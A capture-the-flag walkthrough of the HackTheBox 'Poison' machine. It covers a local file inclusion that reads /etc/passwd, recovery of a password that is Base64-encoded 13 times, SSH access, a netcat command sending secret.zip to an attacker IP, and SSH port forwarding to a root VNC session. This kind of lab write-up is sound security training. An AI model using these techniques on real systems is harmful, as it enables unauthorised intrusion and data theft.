# Poison - Medium

```sh
sudo vim /etc/hosts
# add poison.htb

nmap -T4 -p- -A -Pn -v poison.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 7.2
    * 80/tcp - http - Apache httpd 2.4.29

* the webpage shows that it is a temporary website to test local .php scripts; it also lists the sites to be tested - ini.php, info.php, listfiles.php, phpinfo.php

* the website has an input field for entering the scriptname - we can intercept valid requests in Burp Suite to understand the webpage

* if we enter a PHP script from the given list, like phpinfo.php, we can see that the website performs a GET request to '/browse.php?file=phpinfo.php', and we get the phpinfo.php script rendered in the webpage

* this also discloses version info:

    * PHP version 5.6.32
    * FreeBSD 11.1
    * config file path (php.ini) - ```/usr/local/etc```

* similarly, we can test viewing other PHP scripts

* viewing listfiles.php shows that there is a non-default file 'pwdbackup.txt' in the same directory

* also, if we test for LFI by entering file path itself, it works; for example, we can view ```/etc/passwd``` by navigating to 'http://poison.htb/browse.php?file=/etc/passwd'

* ```/etc/passwd``` shows that we have a user 'charix' on the box

* if we try to view the 'pwdbackup.txt' file by navigating to 'http://poison.htb/browse.php?file=pwdbackup.txt', it works - we get a blob of encoded text, and there is a message saying the password is encoded atleast 13 times

* if we try decoding this encoded text in [CyberChef](https://cyberchef.org) by applying the 'from Base64' decode 13 times, we get the cleartext 'Charix!2#4%6&8(0'

* we can try to SSH as 'charix':

    ```sh
    ssh charix@poison.htb
    # this works

    ls -la

    cat user.txt
    # user flag
    ```

* the home directory for 'charix' also contains a non-default file 'secret.zip' - we can transfer this to attacker and check this:

    ```sh
    # on attacker
    nc -nvlp 4444 > secret.zip
    ```

    ```sh
    # on target
    
    which nc
    # available

    nc 10.10.14.95 4444 -w 3 < secret.zip
    # transfers the file to attacker
    ```

    ```sh
    unzip secret.zip
    # this asks for password
    # we can use same password as before

    # this extracts a file 'secret'
    cat secret
    ```

* the secret file gives a text which looks like gibberish and includes non-ASCII chars

* we can try using this as a password for 'root' user, but it does not work

* we can attempt basic enumeration manually before using ```linpeas```:

    ```sh
    id

    sudo -l
    # sudo not available on box

    ss -ltnp
    # ss not available on box

    sockstat -l
    # alternative for netstat
    ```

* using the ```sockstat -l``` command, we are able to list the listening ports - this shows the ```Xvnc``` service is running locally on ports 5801 and 5901

* we can try accessing the ```Xvnc``` service by forwarding port 5901 via SSH:

    ```sh
    ssh -L 1234:localhost:5901 charix@poison.htb
    # local port forwarding
    ```

* now we can access the ```Xvnc``` service on our port 1234 - we can [enumerate the vnc service](https://exploit-notes.hdks.org/exploit/network/protocol/vnc/):

    ```sh
    # on attacker

    nmap --script *vnc* -p 1234 localhost

    vncviewer localhost:1234
    # using the passwords found earlier does not work

    # we can try passing it as a file instead

    vncviewer -passwd ./secret localhost:1234
    # check with the 'secret' file
    # this works
    ```

* using the 'secret' file as password, we are able to log into the VNC viewer - this lands us in the root shell directly - we can get the root flag from ```/root/root.txt```
